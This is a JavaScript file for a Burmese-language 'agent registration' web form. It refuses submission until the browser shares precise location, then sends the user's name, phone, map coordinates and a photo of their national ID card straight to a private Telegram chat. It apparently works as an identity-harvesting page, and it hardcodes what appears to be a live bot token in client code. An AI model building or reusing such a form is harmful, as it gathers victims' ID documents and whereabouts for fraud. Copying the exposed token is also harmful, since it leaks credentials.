document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('registrationForm');
  const submitBtn = document.getElementById('submitBtn');
  const countdownDisplay = document.getElementById('countdown');
  let userLocation = null;
  let canSubmit = true;
  let countdownInterval;

  // Function to request location
  function requestLocation(callback) {
      if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
              function (position) {
                  userLocation = {
                      latitude: position.coords.latitude,
                      longitude: position.coords.longitude
                  };
                  submitBtn.disabled = false;
                  if (callback) callback(true);
              },
              function (error) {
                  alert('Location မဖွင့်ရသေးပါ။ ဆက်လက်လုပ်ဆောင်ရန် Location ဖွင့်ပေးပါ။');
                  submitBtn.disabled = true;
                  if (callback) callback(false);
              }
          );
      } else {
          alert('သင့် device မှာ Location feature မရှိပါ။');
          submitBtn.disabled = true;
          if (callback) callback(false);
      }
  }

  // Request location immediately when page loads
  requestLocation();

  // Function to start countdown
  function startCountdown() {
      let timeLeft = 60; // 1 minute in seconds
      countdownDisplay.style.display = 'block';
      
      countdownInterval = setInterval(function() {
          timeLeft--;
          countdownDisplay.textContent = `နောက်တစ်ကြိမ် Submit လုပ်ရန် ${timeLeft} စက္ကန့်ကျန်ပါသည်`;
          
          if (timeLeft <= 0) {
              clearInterval(countdownInterval);
              countdownDisplay.style.display = 'none';
              canSubmit = true;
              submitBtn.disabled = false;
          }
      }, 1000);
  }

  form.addEventListener('submit', async function (e) {
      e.preventDefault();

      if (!canSubmit) {
          alert('ကျေးဇူးပြု၍ ၁ မိနစ်စောင့်ပါ။ နောက်တစ်ကြိမ် Submit လုပ်ရန် အချိန်ကျန်ပါသည်။');
          return;
      }

      if (!userLocation) {
          requestLocation(function (success) {
              if (success) {
                  form.submit();
              } else {
                  alert('Location ခွင့်ပြုမှု မရှိသေးပါ။ Submit လုပ်မရနိုင်ပါ။');
              }
          });
          return;
      }

      const name = document.getElementById('name').value;
      const phone = document.getElementById('phone').value;
      const nrcPhoto = document.getElementById('nrcPhoto').files[0];

      if (!nrcPhoto) {
          alert('မှတ်ပုံတင်ပုံ မထည့်ရသေးပါ။');
          return;
      }

      try {
          submitBtn.disabled = true;
          canSubmit = false;
          startCountdown();

          const telegramBotToken = '7815283869:AAFb0D8sfsTwUbU3hC9Oq4dFGBLNYi_D-tE';
          const telegramChatId = '1206019502';

          const messageText = `📝 Agent Registration
👤 Name: ${name}
📞 Phone (Viber): ${phone}
📍 Location: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}`;

          // Send text message
          await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                  chat_id: telegramChatId,
                  text: messageText
              })
          });

          // Send photo
          const photoFormData = new FormData();
          photoFormData.append('chat_id', telegramChatId);
          photoFormData.append('photo', nrcPhoto);

          const photoResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
              method: 'POST',
              body: photoFormData
          });

          if (!photoResponse.ok) {
              throw new Error('Failed to send photo');
          }

          alert('အေးဂျင့်လျှောက်ခြင်းအောင်မြင်ပါသည်။ မကြာမီ ကိုယ်စားလှယ်များ ဆက်သွယ်လာပါလိမ့်မည်။');
          form.reset();
      } catch (error) {
          console.error('Error submitting form:', error);
          alert('မှတ်ပုံတင်ပုံပေးပို့ရာတွင် အမှားတစ်ခုဖြစ်နေပါသည်။ ကျေးဇူးပြု၍ နောက်တစ်ကြိမ်ထပ်ကြိုးစားပါ။');
          clearInterval(countdownInterval);
          canSubmit = true;
          submitBtn.disabled = false;
          countdownDisplay.style.display = 'none';
      }
  });
});